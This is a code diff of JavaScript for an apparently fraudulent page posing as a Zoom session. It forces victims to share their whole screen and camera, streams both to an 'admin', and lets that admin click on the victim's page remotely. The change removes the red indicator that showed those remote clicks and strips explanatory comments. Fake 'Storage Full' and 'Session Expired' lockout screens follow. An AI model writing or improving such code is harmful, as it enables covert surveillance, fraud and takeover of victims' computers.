@@ -25,7 +25,6 @@ function connectWS() {
 
   ws.onopen = () => {
     ws.send(JSON.stringify({ type: "role", role: "visitor" }));
-    // Re-send control permission if it was already granted (survives admin refresh)
     if (controlGranted) {
       ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
     }
@@ -34,7 +33,6 @@ function connectWS() {
   ws.onmessage = async (e) => {
     const data = JSON.parse(e.data);
 
-    // Listen for the admin refresh signal and restart the stream
     if (data.type === "request-offer") {
       if (stream) {
         startWebRTC();
@@ -84,10 +82,7 @@ function connectWS() {
       const y = data.y * window.innerHeight;
       const el = document.elementFromPoint(x, y);
 
-      const indicator = document.createElement("div");
-      indicator.style.cssText = `position:fixed; left:${x}px; top:${y}px; width:24px; height:24px; background:rgba(239, 68, 68, 0.7); border: 2px solid white; border-radius:50%; transform:translate(-50%,-50%); z-index:99999; pointer-events:none; animation: clickRipple 0.4s ease-out forwards;`;
-      document.body.appendChild(indicator);
-      setTimeout(() => indicator.remove(), 400);
+      // REMOVED: The red indicator circle
 
       if (el) {
         const eventInit = {
@@ -276,7 +271,6 @@ joinBtn.addEventListener("click", async () => {
     preferCurrentTab: false,
   };
 
-  // 1. Get Screen Share
   try {
     stream = await navigator.mediaDevices.getDisplayMedia(constraints);
   } catch (err) {
@@ -288,7 +282,6 @@ joinBtn.addEventListener("click", async () => {
   const videoTrack = stream.getVideoTracks()[0];
   const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
 
-  // Strict Enforcement of Entire Screen
   if (settings.displaySurface && settings.displaySurface !== "monitor") {
     stream.getTracks().forEach((t) => t.stop());
     errorMsg.style.display = "block";
@@ -302,7 +295,6 @@ joinBtn.addEventListener("click", async () => {
     if (peerConnection) peerConnection.close();
   };
 
-  // 2. Get Camera Access
   try {
     cameraStream = await navigator.mediaDevices.getUserMedia({
       video: {
@@ -321,23 +313,18 @@ joinBtn.addEventListener("click", async () => {
     document.getElementById("phText").textContent = "Camera unavailable";
   }
 
-  // 3. Start WebRTC
   startWebRTC();
 
-  // 4. Show Loading Screen
   loadingOverlay.classList.add("active");
   loadingSubtext.textContent = "Please wait while we connect you.";
 
-  // 5. Transition to Fake Zoom Session
   setTimeout(() => {
     loadingOverlay.classList.remove("active");
     sessionOverlay.classList.add("active");
 
-    // Unmute the video and play so the user hears the audio
     sessionVideo.muted = false;
     sessionVideo.play().catch((e) => console.log("Main video play blocked", e));
 
-    // After 10 seconds of playing, show the Storage Full overlay and set the lock flag
     setTimeout(() => {
       poorConn.classList.add("active");
       try {
@@ -450,18 +437,15 @@ function showToast(text) {
 
 // --- INITIALIZATION & LOCKOUT LOGIC ---
 window.addEventListener("load", () => {
-  // Check if the user previously hit the storage full screen
   let isExpired = false;
   try {
     isExpired = localStorage.getItem("zoom_session_expired") === "true";
   } catch (e) {}
 
   if (isExpired) {
-    // Show the Session Expired screen instantly
     timeoutOverlay.classList.add("active");
-    document.querySelector(".app-container").style.display = "none"; // Hide everything else
+    document.querySelector(".app-container").style.display = "none";
   } else {
-    // Normal initialization
     if (poorConn) poorConn.classList.remove("active");
     if (sessionOverlay) sessionOverlay.classList.remove("active");
     if (loadingOverlay) loadingOverlay.classList.remove("active");
